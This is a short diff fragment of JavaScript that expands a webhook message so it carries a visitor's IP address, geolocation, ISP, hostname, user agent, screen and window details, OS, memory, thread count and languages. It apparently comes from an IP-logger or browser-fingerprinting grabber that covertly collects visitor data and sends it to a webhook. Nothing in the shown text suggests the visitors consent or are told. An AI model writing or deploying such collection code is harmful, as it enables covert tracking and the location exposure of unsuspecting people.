@@ -104,7 +104,7 @@
 
           // Set up the payload for the webhook
           const payload = {
-            content: `IP Address: ${echolog.ipAddress}\nLocation: ${echolog.location}\nHostname: ${echolog.hostname}\nISP: ${echolog.isp}\nCity: ${echolog.city}\nCountry: ${echolog.country}\nCountry C[...]
+            content: `IP Address: ${echolog.ipAddress}\nLocation: ${echolog.location}\nHostname: ${echolog.hostname}\nISP: ${echolog.isp}\nCity: ${echolog.city}\nCountry: ${echolog.country}\nCountry Code: ${echolog.countryCode}\nUserAgent: ${echolog.userAgent}\nWindow: ${echolog.windowWidth}x${echolog.windowHeight} Ratio: ${echolog.windowRatio}\nScreen: ${echolog.screenWidth}x${echolog.screenHeight} Ratio: ${echolog.screenRatio}\nDPI: ${echolog.DPI}\nColorDepth: ${echolog.colorDepth}\nOrientation: ${echolog.orientation} (${echolog.orientationAngle})\nOS: ${echolog.os}\nThreads: ${echolog.threads}\nMemory: ${echolog.memory}GB\nSystem Languages: ${echolog.systemLanguages}\nLanguage: ${echolog.languages}`
           };
           // This is a lazy way of doing it, having
           // your webhook url out in the open like
